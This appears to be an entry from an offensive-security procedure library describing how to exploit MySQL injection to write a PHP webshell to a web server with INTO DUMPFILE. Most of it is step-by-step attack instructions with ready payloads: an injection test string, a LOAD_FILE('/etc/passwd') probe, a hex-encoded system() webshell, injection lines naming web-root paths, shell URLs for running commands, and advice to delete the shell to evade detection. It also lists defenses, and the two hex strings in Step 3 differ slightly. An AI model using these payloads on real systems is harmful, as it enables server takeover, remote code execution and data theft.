---
id: 8a718c91-9b49-4228-a4c8-56184fefa77b
type: procedure
name: MySQL-Dumpfile-PHP-Shell-Creation
verified: true
submitted: false
created_at: '2023-04-06T03:56:34.851406+00:00'
updated_at: '2023-04-10T20:22:53.820243+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011]]'
  - '[[tactics/Defense Evasion|TA0005]]'
  - '[[tactics/Execution|TA0002]]'
  - '[[tactics/Lateral Movement|TA0008]]'
techniques:
  - '[[techniques/Exploit Public-Facing Application|T1190]]'
  - '[[techniques/Command and Scripting Interpreter|T1059.007]]'
sub_techniques: []
tags:
  - '[[tags/Into dumpfile method]]'
  - '[[tags/MYSQL Injection]]'
  - '[[tags/MYSQL Write a shell]]'
commands: []
platforms:
  - Web
  - Linux
  - Windows
tools: []
validated: true
---

# MySQL-Dumpfile-PHP-Shell-Creation

## Summary

This procedure exploits a MySQL injection vulnerability to write a PHP webshell to the target web server's filesystem using the INTO DUMPFILE clause in a UNION SELECT statement. By injecting a hexadecimal-encoded PHP payload, an attacker can create a backdoor file that allows remote command execution, enabling further post-exploitation activities such as privilege escalation or data exfiltration.

## Description

In scenarios where a web application is vulnerable to SQL injection, attackers can leverage MySQL's file-writing capabilities to create malicious files on the server. The dumpfile method uses the INTO OUTFILE or INTO DUMPFILE to write query results directly to a file, bypassing typical file upload restrictions. This technique targets writable directories in the web root (e.g., /var/www/html/ on Linux or C:/Program Files/EasyPHP-12.1/www/ on Windows). Once the PHP shell is created, it can be accessed via HTTP to execute system commands. This is particularly effective against applications using MySQL as the backend database and PHP for server-side scripting. Prerequisites include identifying an injectable parameter (e.g., via error-based or blind SQLi) and determining writable paths through database enumeration.

## Requirements

1. Confirmed SQL injection vulnerability in a MySQL-backed web application (e.g., via tools like [[tools/sqlmap]] or manual testing).
2. Knowledge of the web server's document root and writable directories (e.g., enumerated using SELECT @@datadir or LOAD_FILE()).
3. Attacker-controlled input point, such as a search form or URL parameter.
4. Web browser or proxy tool (e.g., Burp Suite) to craft and send the injection payload.
5. Basic understanding of hexadecimal encoding for payloads to evade basic filters.

## Defense

- Implement strict input validation, sanitization, and escaping for all user inputs to prevent SQL injection.
- Use prepared statements or parameterized queries in application code to separate SQL logic from data.
- Apply the principle of least privilege to the MySQL database user, revoking FILE privileges to block INTO DUMPFILE usage.
- Monitor web server logs for anomalous file creations in web directories and enable database auditing for suspicious queries.
- Deploy web application firewalls (WAFs) tuned to detect UNION-based injections and file write attempts.

## Objectives

1. Exploit SQL injection to write a PHP shell to the target filesystem.
2. Establish remote command execution capability via the webshell.
3. Facilitate further actions like lateral movement, data exfiltration, or persistence.

## Instructions

### Step 1: Confirm SQL Injection Vulnerability

**Context**: Verify that the target endpoint is vulnerable to SQL injection, focusing on error-based or union-based techniques to ensure you can append a UNION SELECT statement.

Identify an injectable parameter (e.g., id=1 in a URL) and test with a payload like ' OR 1=1 -- to confirm control over the query.

**Expected Output**: Database error revealing MySQL version or successful query alteration (e.g., all records returned).

### Step 2: Enumerate Writable Paths and Database Privileges

**Context**: Determine if the MySQL user has FILE privileges and identify writable directories to place the shell.

Craft a query like SELECT @@secure_file_priv to check restrictions, or attempt a test write with a benign file. Use database functions like LOAD_FILE('/etc/passwd') to probe paths, then confirm writability.

**Expected Output**: Response indicating FILE privilege (no error on privilege check) and accessible paths (e.g., /var/www/html/).

### Step 3: Encode the PHP Payload

**Context**: Convert a simple PHP webshell (e.g., <?php system($_GET['c']); ?>) to hexadecimal to bypass potential filters, ensuring it's suitable for injection.

Use an online hex encoder or Python script to convert the payload string to hex format (e.g., 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e).

**Expected Output**: Hexadecimal string ready for injection, such as 0x3c3f7068702073797374656d28245f4745545b2263275d293b203f3e.

### Step 4: Inject the Payload to Create the Shell

**Context**: Append the UNION SELECT with the hex payload and INTO DUMPFILE to write the file. Match the number of columns in the original query (e.g., add NULLs if needed).

Use the code snippet [[codes/MySQL-Dumpfile-PHP-Shell-Payload]] to craft the injection:

```sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
```

Submit via the vulnerable parameter (e.g., id=1' [payload] --).

**Expected Output**: No SQL error, and the file is created (verifiable by accessing http://target/shell.php?c=whoami).

### Step 5: Verify and Interact with the Shell

**Context**: Confirm the shell was written successfully and test command execution to ensure control.

Navigate to the shell URL (e.g., http://target/shell.php?c=id) and execute a benign command like id or dir.

**Expected Output**: Command output displayed in the browser (e.g., uid=33(www-data) on Linux), confirming RCE.

### Step 6: Clean Up or Escalate

**Context**: If needed, delete the shell to evade detection or use it for further actions like uploading more tools.

Execute rm /var/www/html/shell.php via the shell, or leverage it to run privilege escalation commands.

**Expected Output**: File removal confirmation or successful escalation (e.g., root shell).
